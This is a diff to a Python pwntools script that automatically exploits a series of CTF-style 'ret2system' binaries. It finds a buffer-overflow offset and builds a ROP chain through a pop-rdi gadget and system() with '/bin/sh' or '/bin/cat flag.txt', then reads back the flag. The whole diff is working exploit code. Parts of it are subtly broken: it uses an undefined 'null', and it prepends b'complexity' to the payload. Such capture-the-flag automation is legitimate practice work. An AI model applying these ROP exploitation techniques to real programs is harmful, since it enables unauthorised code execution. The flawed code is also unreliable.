@@ -19,9 +19,9 @@ def exploit(binary: str):
     e = ELF(binary)
     r = ROP(e)
 
-    p.recvuntil(b'>>>')
+    p.recvuntil(b'>>>\n')
 
-    payload = b''
+    payload = b'complexity'
 
     system = null
     pop_rdi = null
@@ -32,21 +32,7 @@ def exploit(binary: str):
     except:
         print('[!] pop rdi; ret; not found')
         pass
-    # print(pop_rdi)
-    shell = null
-    cat = null
-    try:
-        shell = next(e.search(b'/bin/sh'))
-        print(f"[+]Location of bin/sh: {hex(shell)}")
-    except:
-        print('[!] bin/shell not found')
-        pass
-    try:
-        cat = next(e.search(b'/bin/cat flag.txt'))
-        print(f"[+] Location of bin/cat flag.txt: {hex(cat)} {cat}")
-    except:
-        print('[!] Bin/cat flag not found')
-        pass
+
     try:
         system = e.sym['system']
         print(f"[+] System Address: {hex(system)}")
@@ -55,30 +41,31 @@ def exploit(binary: str):
 
     offset = detection.find_rip_offset(binary)
     print("[+] Offset:", offset)
-
     payload += cyclic(offset)
     payload += p64(pop_rdi)
-    if cat != null:
-        print('bin/cat')
-        payload += p64(cat)
-        #print(payload)
-        payload += p64(system)
-        print(payload)
-        p.sendline(payload)
 
-    elif shell != null:
-        print('bin/sh')
+    try:
+        shell = next(e.search(b'/bin/sh'))
+        print(f"[+]Location of bin/sh: {hex(shell)}")
         payload += p64(shell)
         payload += p64(system)
         p.sendline(payload)
         # p.wait()
         p.sendline(b'cat flag.txt')
-        p.interactive()
-    else:
-        print('[!] uhhhhhhhhhhhh')
+    except:
+        print('[!] bin/shell not found')
+        try:
+            cat = next(e.search(b'/bin/cat flag.txt'))
+            print(f"[+] Location of bin/cat flag.txt: {hex(cat)} {cat}")
+            payload += p64(cat)
+            payload += p64(system)
+            p.sendline(payload)
+        except:
+            print('[!] Bin/cat flag not found')
+            pass
 
     output = p.recvall(timeout=0.2)
-
+    print(f"output: {output}")
     flag = re.findall(flag_regex, output.decode())
     if flag:
         return flag[0]
@@ -89,7 +76,8 @@ def exploit(binary: str):
 def main():  # TEMP FOR TESTING
     for i in range(10):
         print(f"bin-ret2system-{i}")
-        exploit(f"bin-ret2system-{i}")
+        flag = exploit(f"bin-ret2system-{i}")
+        print(flag)
 
 
 main()
